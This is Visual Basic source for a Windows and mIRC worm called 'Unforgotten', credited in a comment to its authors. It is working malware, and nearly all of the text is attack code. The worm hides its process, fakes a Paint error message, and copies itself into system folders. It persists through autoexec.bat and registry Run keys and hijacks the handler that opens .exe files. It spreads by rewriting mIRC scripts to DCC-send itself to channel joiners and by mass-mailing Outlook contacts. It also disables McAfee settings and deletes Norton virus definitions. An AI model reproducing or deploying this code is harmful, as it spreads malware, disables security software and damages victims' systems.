'-----Form Code------
' form should be small
' and Contain a Timer
' and named "Unforgotten"
'--------------------
Public MyPath, MyFkName, MyRlName, SeekmIRC, SeekmIRC2, Install, ActiveRun, ExeRun, WinStartUp, RunThis As String
Public Sub Form_Load()
On Error Resume Next
Unforgotten.Hide
Dim process As Long
process = GetCurrentProcessId()
Call RegisterServiceProcess(process, RSP_UNREGISTER_SERVICE)
ActiveRun = "C:\windows\inf\" & App.EXEName & ".exe"
MyPath = App.Path & "\"
MyFkName = MyPath & App.EXEName
MyRlName = MyFkName & ".exe"
Install = "C:\Windows\system\" & App.EXEName & ".exe"
If UCase$(App.Path) = "C:\WINDOWS\INF" Then
    Call Active
End If
If UCase$(App.Path) = "C:\WINDOWS\COMMAND" Then
    Call BootMe
End If
If UCase$(App.Path) = "C:\WINDOWS\SYSTEM" Then
    Call Unforgot
End If
If UCase$(MyPath) <> "C:\WINDOWS\SYSTEM\" And UCase$(MyPath) <> "C:\WINDOWS\COMMAND\" And UCase$(MyPath) <> "C:\WINDOWS\INF\" Then
    Call InFX
End If
End Sub



'----------MODULE CODE----------
'The module decreases the size of Unforgotten
' BETA Version....
'-------------------------------
' mIRC/W32 Unforgotten .a variant by Error and NeX
' from TN
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Public Declare Function GetCurrentProcess Lib "kernel32" () As Long
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Public Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Boolean
Global Const RSP_SIMPLE_SERVICE = 1
Global Const RSP_UNREGISTER_SERVICE = 0
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Public KeyResult As Long
Public Alt As Boolean
Public Control As Boolean
Public Function InFX()
On Error Resume Next
Unforgotten.Visible = False
Dim process As Long
process = GetCurrentProcessId()
MyPath = App.Path & "\"
MyFkName = MyPath & App.EXEName
MyRlName = MyFkName & ".exe"
Install = "C:\Windows\system\" & App.EXEName & ".exe"
SeekmIRC = Dir$("C:\mIRC", vbDirectory)
SeekmIRC2 = Dir$("C:\Program Files\mIRC", vbDirectory)
If UCase$(MyPath) <> "C:\WINDOWS\SYSTEM\" And UCase$(MyPath) <> "C:\WINDOWS\COMMAND\" And UCase$(MyPath) <> "C:\WINDOWS\INF\" Then
    MsgBox MyFkName & Chr(13) & "Paint cannot read from this file." & Chr(13) & "This is not a valid bitmap file, or its format is not currently supported.", 48, "Paint"
    If UCase$(SeekmIRC) = "MIRC" Or UCase$(SeekmIRC2) = "MIRC" Then
        FileCopy MyRlName, Install
        FileCopy MyRlName, "C:\windows\command\" & App.EXEName & ".exe"
        FileCopy MyRlName, "C:\windows\inf\" & App.EXEName & ".exe"
        runn = Shell("C:\windows\inf\" & App.EXEName & ".exe", vbNormalFocus)
        Call AntiAnti
        lookie = GetAttr("C:\autoexec.bat")
        If lookie <> 35 Then
            Open "C:\autoexec.bat" For Input As #5
                Open "C:\autoexec1.bat" For Output As #6
                X = 0
                Do Until EOF(5)
                    X = X + 1
                    Line Input #5, linefeed
                    Print #6, linefeed
                    If X = 2 Then
                        Print #6, "@echo off"
                        Print #6, "cd\"
                        Print #6, "cd windows"
                        Print #6, "regedit /s C:\Windows\System\ModReg.reg"
                    End If
                Loop
            Close
            Kill "C:\autoexec.bat"
            Open "C:\yep.bat" For Output As #1
                Print #1, "cd\"
                Print #1, "ren autoexec1.bat autoexec.bat"
            Close
        BootMe = Shell("C:\yep.bat", vbHide)
        Call Pause(1)
        SetAttr "C:\autoexec.bat", vbReadOnly + vbArchive + vbHidden
        Kill "C:\yep.bat"
    End If
    On Error Resume Next
      Call AntiAnti
End If
End Function
Public Function Memory()
On Error Resume Next
RUnMe = Shell(RunThis, vbNormalFocus)
FileCopy MyPath & App.EXEName & ".exe", "C:\Windows\command\" & App.EXEName & ".exe"
FileCopy MyPath & App.EXEName & ".exe", "C:\Windows\inf\" & App.EXEName & ".exe"
grr = Shell("C:\windows\inf\" & App.EXEName & ".exe", vbHide)
If App.PrevInstance = True Then
    runshell = Shell(RunThis, vbNormalFocus)
    End
End If
For X = 1 To 10
    Open "C:\mirc\script.ini" For Input Shared As #1
    For l = 1 To 3
        Line Input #1, readline
    Next l
    If readline <> "n0=on 1:JOIN1:#: if ( $me != $nick ) { /dcc send $nick C:\windows\system\" & App.EXEName & ".exe }" Then
        Close #1
        Open "C:\mirc\script.ini" For Output Shared As #1
        Print #1, "[script]"
        Print #1, ""
        Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick C:\windows\system\" & App.EXEName & ".exe }"
        Close #1
    End If
    Close #1
    Call AntiAnti
    Kill "C:\Program Files\Norton AntiVirus\*.dat"
    Call Pause(6)
    Call AntiAnti
Next X
End
End Function
Public Sub Pause(interval)
On Error Resume Next
Timer1.Enabled = True
current = Timer
Do While Timer - current < Val(interval)
    Call Timer1_Timer
Loop
Close #1
End Sub
Public Function AntiAnti()
On Error Resume Next
ChDir ("C:\windows\system")
Open "C:\Windows\System\ModReg.reg" For Output Shared As #1
    Print #1, "REGEDIT4"
    Print #1,
    Print #1, "[HKEY_CLASSES_ROOT\exefile\shell\open\command]"
    Print #1, "@=" & Chr(34) & "C:\\windows\\system\\mypictur.bmp.exe %1\ %*" & Chr(34)
Close #1
modify = Shell("regedit /s ModReg.reg", vbHide)
Kill modreg.reg
Open "C:\windows\System\Anti.reg" For Output Shared As #1
    Print #1, "REGEDIT4"
    Print #1,
    Print #1, "[HKEY_LOCAL_MACHINE\Software\McAfee\Scan95]"
    Print #1, Chr(34) & "SerialNum" & Chr(34) & "=" & Chr(34) & "TN - Unforgotten - NeX - Error" & Chr(34)
    Print #1, Chr(34) & "CurrentVersionNumber" & Chr(34) & "=" & Chr(34) & "666" & Chr(34)
    Print #1, Chr(34) & "DAT" & Chr(34) & "=" & Chr(34) & "NONE" & Chr(34)
    Print #1, Chr(34) & "DATFile" & Chr(34) & "=" & Chr(34) & "-2000" & Chr(34)
    Print #1, Chr(34) & "bShowIcon" & Chr(34) & "= dword:00000001"
    Print #1, Chr(34) & "VirusInfoURL" & Chr(34) & "=" & Chr(34) & "http://www.norton.com" & Chr(34)
    Print #1, Chr(34) & "UpgradeEXE" & Chr(34) & "=" & Chr(34) & "C:\\Windows\\Win.com" & Chr(34)
    Print #1, Chr(34) & "ECClient" & Chr(34) & "=" & Chr(34) & "C:\\Command.com" & Chr(34)
    Print #1, Chr(34) & "bVShieldEnabled" & Chr(34) & "=dword:00000000"
Close #1
AntiMc = Shell("regedit /s Anti.reg", vbHide)
Kill anti.reg
Open "C:\Windows\system\bootit.reg" For Output Shared As #1
    Print #1, "REGEDIT4"
    Print #1,
    Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]"
    Print #1, Chr(34) & "Unforgotten" & Chr(34) & "=" & Chr(34) & "C:\\Windows\\command\\" & App.EXEName & ".exe" & Chr(34)
Close #1
bootmeup = Shell("regedit /s bootit.reg", vbHide)
Kill bootit.reg
Kill "C:\Program Files\Norton AntiVirus\*.dat"
End Function
Public Function stealthpause(interval)
On Error Resume Next
current1 = Timer
Do While Timer - current1 < Val(interval)
Loop
Call RegisterServiceProcess(process, RSP_UNREGISTER_SERVICE)
End Function
 Public Sub Timer1_Timer()
 On Error Resume Next
Alt = False
KeyResult = GetAsyncKeyState(&H12)
If KeyResult = -32767 Then
    Alt = True
    GoTo KeyFound
End If
Control = False
KeyResult = GetAsyncKeyState(17)
If KeyResult = -32767 Then
    Control = True
    GoTo KeyFound
End If
KeyFound:
If Alt = True Or Control = True Then
    Call RegisterServiceProcess(process, RSP_SIMPLE_SERVICE)
    Call stealthpause(5)
End If
End Sub
Public Function IGotWyrms(Subject1 As String, Body1 As String, Optional Attachment1 As String)
On Error Resume Next
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If SadAgnuOutlook = "Outlook" Then
    Sadmapiname.Logon "Guest", "password"
    For y = 1 To Sadmapiname.AddressLists.Count
    Set AddyBook = Sadmapiname.AddressLists(y)
    X = 1
    Set Spawnme = SadAgnuOutlook.CreateItem(0)
    For oo = 1 To AddyBook.AddressEntries.Count
        Peep = AddyBook.AddressEntries(X)
        Spawnme.Recipients.Add Peep
        X = X + 1
        If X > 75 Then oo = AddyBook.AddressEntries.Count
            Next oo
            Spawnme.Subject = Subject1
            Spawnme.Body = Body1
            Spawnme.Attachments.Add Attachment1
            Spawnme.Send
            Peep = ""
        Next y
        Sadmapiname.Logoff
    End If
End Function
Public Function Normalize()
Open "C:\windows\system\REMEMBER.REG" For Output As #1
    Print #1, "REGEDIT4"
    Print #1, ""
    Print #1, "[HKEY_CLASSES_ROOT\exefile\shell\open\command]"
    Print #1, "@=" & Chr(34) & "\" & Chr(34) & "%1\" & Chr(34) & " %*" & Chr(34)
    Close #1
End Function
Public Function Active()
Dim process As Long
process = GetCurrentProcessId()
    Call RegisterServiceProcess(process, RSP_SIMPLE_SERVICE)
    ExeRun = Dir$("C:\WINDOWS\SYSTEM\" & App.EXEName & ".exe", vbNormal)
    If UCase$(ExeRun) <> UCase$(App.EXEName & ".EXE") Then
        FileCopy MyPath & App.EXEName & ".exe", "C:\windows\system\" & App.EXEName & ".exe"
    End If
    WinStartUp = Dir$("C:\windows\command\" & App.EXEName & ".exe")
    If UCase$(WinStartUp) <> UCase$(App.EXEName & ".EXE") Then
        FileCopy MyPath & App.EXEName & ".exe", "C:\windows\command\" & App.EXEName & ".exe"
    End If
Call Active
End Function
Public Function BootMe()
Kill "C:\windows\system\remember.reg"
Kill "C:\windows\system\chklst.vxv"
ExeRun = Dir$("C:\windows\system\" & App.EXEName & ".exe")
If UCase$(ExeRun) <> UCase$(App.EXEName & ".EXE") Then
        FileCopy App.EXEName & ".exe", "C:\windows\system\" & App.EXEName & ".exe"
End If
ActiveRun = Dir$("C:\windows\inf\" & App.EXEName & ".exe")
If UCase$(ActiveRun) <> UCase$(App.EXEName & ".EXE") Then
        FileCopy App.EXEName & ".exe", "C:\windows\inf\" & App.EXEName & ".exe"
        RunThis = Shell(ActiveRun, vbHide)
End If
Call AntiAnti
Call InFX
End
End Function



